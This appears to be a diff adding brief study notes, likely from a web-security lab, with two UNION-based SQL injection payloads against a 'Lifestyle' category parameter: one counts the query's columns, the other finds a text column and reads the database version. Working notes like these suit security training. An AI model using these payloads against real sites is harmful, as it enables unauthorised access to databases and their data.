@@ -1,0 +1,6 @@
+Finding Column :
+Lifestyle' UNION SELECT NULL, NULL -- -
+
+Finding string data type column :
+Lifestyle' UNION SELECT 'a', @@VERSION -- -
+
